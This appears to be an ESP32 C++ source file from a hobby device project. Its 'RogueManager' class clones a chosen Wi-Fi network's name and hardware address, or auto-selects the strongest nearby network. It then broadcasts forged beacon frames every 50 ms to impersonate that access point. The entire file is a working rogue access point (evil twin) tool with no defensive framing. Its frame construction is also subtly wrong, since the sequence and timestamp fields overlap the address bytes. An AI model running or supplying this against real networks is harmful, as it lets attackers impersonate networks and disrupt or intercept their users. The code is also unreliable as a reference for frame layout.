/*
 * SPDX-FileCopyrightText: 2026 StackChan-Gotchi
 * SPDX-License-Identifier: MIT
 */
#include "rogue_manager.h"
#include <esp_log.h>
#include <esp_wifi.h>
#include <nvs.h>
#include <string.h>
#include <hal/hal.h>

static const char* TAG = "gotchi_rogue";

namespace gotchi {

static RogueManager _instance;

RogueManager& getRogueManager() {
    return _instance;
}

RogueManager::RogueManager()
    : _taskHandle(nullptr)
    , _beaconSpamming(false)
    , _autoMode(true) {
    memset(&_target, 0, sizeof(_target));
    _target.valid = false;
    _target.channel = 6;
}

RogueManager::~RogueManager() {
    stop();
}

void RogueManager::setTargetNetwork(const char* ssid, const uint8_t* bssid, uint8_t channel) {
    memset(&_target, 0, sizeof(_target));
    if (ssid) {
        strncpy(_target.ssid, ssid, sizeof(_target.ssid) - 1);
    }
    if (bssid) {
        memcpy(_target.bssid, bssid, 6);
    }
    _target.channel = channel > 0 ? channel : 6;
    _target.valid = true;
    _autoMode = false;
    
    ESP_LOGI(TAG, "Target set: %s (ch:%d)", _target.ssid, _target.channel);
    for (int i = 0; i < 6; i++) {
        printf("%02X", _target.bssid[i]);
        if (i < 5) printf(":");
    }
    printf("\n");
}

void RogueManager::autoSelectStrongest(const std::vector<NetworkInfo>& networks) {
    if (networks.empty()) {
        ESP_LOGW(TAG, "No networks to select from");
        _target.valid = false;
        return;
    }

    int8_t bestRssi = -100;
    const NetworkInfo* best = nullptr;
    
    for (const auto& net : networks) {
        if (net.rssi > bestRssi) {
            bestRssi = net.rssi;
            best = &net;
        }
    }

    if (best) {
        setTargetNetwork(best->ssid, best->bssid, best->channel);
        _autoMode = true;
        ESP_LOGI(TAG, "Auto-selected strongest: %s (RSSI:%d, ch:%d)", 
                 _target.ssid, bestRssi, _target.channel);
    }
}

void RogueManager::loadFromNVS() {
    nvs_handle_t nvs;
    if (nvs_open("rogue", NVS_READONLY, &nvs) == ESP_OK) {
        char ssid[33] = {0};
        uint8_t bssid[6] = {0};
        uint8_t channel = 6;
        uint8_t autoVal = 1;
        
        size_t len = sizeof(ssid);
        if (nvs_get_str(nvs, "ssid", ssid, &len) == ESP_OK) {
            size_t bssidLen = sizeof(bssid);
            nvs_get_blob(nvs, "bssid", bssid, &bssidLen);
            nvs_get_u8(nvs, "channel", &channel);
            nvs_get_u8(nvs, "auto", &autoVal);
            _autoMode = (autoVal != 0);
            setTargetNetwork(ssid, bssid, channel);
            ESP_LOGI(TAG, "Loaded from NVS: %s (ch:%d, auto:%d)", ssid, channel, _autoMode);
        }
        nvs_close(nvs);
    }
}

void RogueManager::saveToNVS() {
    if (!_target.valid) return;
    
    nvs_handle_t nvs;
    if (nvs_open("rogue", NVS_READWRITE, &nvs) == ESP_OK) {
        nvs_set_str(nvs, "ssid", _target.ssid);
        nvs_set_blob(nvs, "bssid", _target.bssid, 6);
        nvs_set_u8(nvs, "channel", _target.channel);
        nvs_set_u8(nvs, "auto", _autoMode ? 1 : 0);
        nvs_commit(nvs);
        nvs_close(nvs);
        ESP_LOGI(TAG, "Saved to NVS: %s", _target.ssid);
    }
}

void RogueManager::sendBeaconFrame() {
    if (!_target.valid) return;

    uint8_t beacon[128];
    memset(beacon, 0, sizeof(beacon));
    
    // Beacon frame header
    beacon[0] = 0x80;  // Beacon frame
    beacon[1] = 0x00;
    beacon[2] = 0x00;
    beacon[3] = 0x00;
    
    // Broadcast destination
    memset(&beacon[4], 0xFF, 6);
    
    // Source BSSID (our fake AP)
    memcpy(&beacon[10], _target.bssid, 6);
    
    // BSSID 
    memcpy(&beacon[16], _target.bssid, 6);
    
    // Sequence
    beacon[18] = 0x00;
    beacon[19] = 0x00;
    
    // Timestamp
    uint64_t timestamp = GetHAL().millis() * 1000;
    for (int i = 0; i < 8; i++) {
        beacon[20 + i] = (timestamp >> (i * 8)) & 0xFF;
    }
    
    // Beacon interval + capability
    beacon[28] = 0x64;  // 100 TU
    beacon[29] = 0x00;
    
    // SSID tag
    beacon[30] = 0x00;  // SSID
    beacon[31] = strlen(_target.ssid);
    memcpy(&beacon[32], _target.ssid, strlen(_target.ssid));
    
    uint32_t pos = 32 + strlen(_target.ssid);
    
    // Supported rates
    beacon[pos++] = 0x01;  // Supported rates
    beacon[pos++] = 4;
    beacon[pos++] = 0x82;
    beacon[pos++] = 0x84;
    beacon[pos++] = 0x8B;
    beacon[pos++] = 0x96;
    
    // DS Parameter set (channel)
    beacon[pos++] = 0x03;  // DS Parameter set
    beacon[pos++] = 1;
    beacon[pos++] = _target.channel;
    
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
}

void RogueManager::start() {
    if (_beaconSpamming) return;
    
    ESP_LOGI(TAG, "Starting Rogue mode");
    
    _beaconSpamming = true;
    xTaskCreate(beaconTask, "rogue_task", 4096, this, 5, &_taskHandle);
}

void RogueManager::stop() {
    if (!_beaconSpamming) return;
    
    ESP_LOGI(TAG, "Stopping Rogue mode");
    _beaconSpamming = false;
    
    if (_taskHandle) {
        vTaskDelay(pdMS_TO_TICKS(100));
        _taskHandle = nullptr;
    }
}

void RogueManager::beaconTask(void* param) {
    RogueManager* self = (RogueManager*)param;
    ESP_LOGI(TAG, "Rogue beacon task started");
    
    uint32_t beaconCount = 0;
    uint32_t lastLog = GetHAL().millis();
    
    while (self->_beaconSpamming) {
        if (self->_target.valid) {
            self->sendBeaconFrame();
            beaconCount++;
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));  // 50ms between beacons
        
        if (GetHAL().millis() - lastLog > 5000) {
            ESP_LOGI(TAG, "Beacons sent: %u, target: %s (ch:%d)", 
                     beaconCount, self->_target.ssid, self->_target.channel);
            lastLog = GetHAL().millis();
        }
    }
    
    ESP_LOGI(TAG, "Rogue stopped, sent %u beacons", beaconCount);
    vTaskDelete(NULL);
}

}